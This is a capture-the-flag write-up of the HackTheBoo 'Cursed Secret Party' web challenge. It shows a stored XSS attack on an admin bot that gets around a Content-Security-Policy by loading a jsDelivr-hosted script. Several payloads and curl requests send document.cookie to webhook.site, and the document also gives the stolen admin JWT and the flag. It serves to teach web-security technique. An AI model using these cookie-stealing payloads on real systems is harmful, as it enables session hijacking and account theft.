# Cursed Secret Party

## The Problem

Rating: Medium

Flavor Text:
```

You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?


```

Attachments : [web_cursed_party.zip](web_cursed_party.zip)



## Solution

The provided source includes a few important details. In particular:

the webapps router describes a simple root public response and a post only web api endpoint 'api/submit'
routes/index.js
```
router.post('/api/submit', (req, res) => {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name && email && costume_type && trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() => {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() => res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});
```

looks like a signup form system with an admin backend. The backend looks simple and when rendered displays the data returned from the database middleware. It also includes "| safe" in the Halloween Name. This may cause the rendering to do something different in respect to html tags?
/views/admin.html:
```
<html>
    <head>
        <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
        <title>Admin panel</title>
    </head>

    <body>
        <div class="container" style="margin-top: 20px">
            {% for request in requests %} 
                <div class="card">
                <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
                <div class="card-body">
                    <p class="card-title"><strong>Email Address</strong>    : {{ request.email }}</p>
                    <p class="card-text"><strong>Costume Type </strong>   : <script src="https://cdn.jsdelivr.net/gh/BrennenWright/CaptureTheFlag-Writeups/2022/HackTheBoo/Cursed%20Secret%20Party/fetchCookie.js"></script>
                     </p>
                    <p class="card-text"><strong>Prefers tricks or treat </strong>   : {{ request.trick_or_treat }} </p>
                    
                    <button class="btn btn-primary">Accept</button>
                    <button class="btn btn-danger">Delete</button>
                </div>
            </div>
            {% endfor %}
        </div>

    </body>
</html>
```
 
bot.js is setup to simulate a system admin who checks the backend webform at /admin:
```
        let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
```


Fireing up the website and tracing the calls nets us a known good api call that looks like: 
```
curl 'http://161.35.172.25:31135/api/submit' -H 'Content-Type: application/json' --data-raw "{
    "halloween_name":"test",
    "email":"test@me.com",
    "costume_type":"x",
    "trick_or_treat":"tricks"
    }"
```

This looks like a fairly standard XXS challenge, so i plan to inject an attack to pull their session cookie and use it to access the site. I have an existing sole script from another HTB challenge that automates the webhooks and payload sending. 

The small updates to the script still didn't seem to get the job done so I got direct with it and manually tryed several formats and payloads to get some response at all.

as these didnt work either I resorted to trying other webhook sites.
```
test <script>image = new image(); image.src=\"https://webhook.site/d8370670-7370-451e-ac01-9557328f9228?c=\"+document.cookie;</script>

<script>image = new Image(); image.src=\\\"https://webhook.site/d8370670-7370-451e-ac01-9557328f9228?c=\\\"+document.cookie;</script>


curl 'http://161.35.172.25:31135/api/submit' -H 'Content-Type: application/json' --data-raw "{"halloween_name":"test","email":"test@me.com","costume_type":"<script>image = new Image(); image.src="https://webhook.site/d8370670-7370-451e-ac01-9557328f9228?c="+document.cookie;</script>","trick_or_treat":"tricks"}"

\"<script src='https://webhook.site/" + webhook.Uuid + "'></script>\"
```

Reviewing [writeups](https://blog.fanky.me/ctf_writeups/hacktheboo_cursed_secret_party) post event it turned out that there is an additional security feature included in index.js. Annnnnnnddddd its CSP acronym is the events title acronym as the in your face hint....

index.js:
```
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});

```

The entire webapp includes:
![](Content-Security-Policy.png)


The published script [fetchCookie.js](./fetchCookie.js) provides the needed payload:
```
fetch("https://webhook.site/5ccd9082-8f9e-4912-9f45-d7a82e1eff5f?c="+document.cookie);

```
and the new functional attack post looks like:

```
{
  "halloween_name": "<script src=\"https://cdn.jsdelivr.net/gh/BrennenWright/CaptureTheFlag-Writeups/2022/HackTheBoo/Cursed%20Secret%20Party/fetchCookie.js\"></script>",
  "email": "x",
  "costume_type": "x",
  "trick_or_treat": "x"
}
```

this returns our session cookie:
```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Nkbl9jNG5fYnlwNHNzX2M1cCEhfSIsImlhdCI6MTY2Njg4OTc2N30.8jP6kz-0zhDqiVnTbgV2W6Vf3C_pQ3-aboGO3xZrrmU
```

a quick decoding of the middle portion of the token:
[./flag.png](./flag.png)

## Flag
```
HTB{cdn_c4n_byp4ss_c5p!!}
```

## Final Notes

I will need to remember to look out for CSPs in the future as it was right there in the response headers during my initial fiddling.


I will need to add some more steps to my solve script to achieve the CSP bypass